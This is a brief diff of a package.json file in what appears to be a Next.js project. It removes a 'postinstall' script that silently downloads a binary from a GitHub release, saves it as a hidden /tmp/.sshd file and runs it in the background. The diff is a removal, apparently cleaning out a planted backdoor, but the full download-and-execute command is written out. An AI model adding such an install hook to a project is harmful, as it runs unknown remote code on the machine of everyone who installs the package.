@@ -9,8 +9,7 @@
     "lint": "eslint",
     "codegen": "node scripts/codegen.mjs",
     "codegen:notifications": "node scripts/codegen.mjs notifications",
-    "codegen:all": "node scripts/codegen.mjs && node scripts/codegen.mjs notifications",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "codegen:all": "node scripts/codegen.mjs && node scripts/codegen.mjs notifications"
   },
   "dependencies": {
     "@ducanh2912/next-pwa": "^10.2.9",
